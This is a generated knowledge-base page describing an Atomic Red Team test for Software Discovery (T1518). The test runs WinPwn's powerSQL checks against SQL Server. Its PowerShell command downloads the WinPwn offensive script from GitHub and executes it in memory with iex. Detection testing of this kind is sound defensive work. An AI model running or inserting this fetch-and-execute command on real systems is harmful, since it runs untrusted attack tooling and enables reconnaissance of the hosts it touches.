---
atomic_guid: "0bb64470-582a-4155-bde2-d6003a95ed34"
title: "WinPwn - powerSQL"
framework: "atomic"
generated: "true"
attack_technique_id: "T1518"
attack_technique_name: "Software Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518/T1518.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "0bb64470-582a-4155-bde2-d6003a95ed34"
  - "WinPwn - powerSQL"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Start PowerUpSQL Checks using powerSQL function of WinPwn

## ATT&CK Mapping

- [[kb/attack/techniques/T1518-software_discovery|T1518: Software Discovery]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powerSQL -noninteractive -consoleoutput
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518/T1518.yaml)
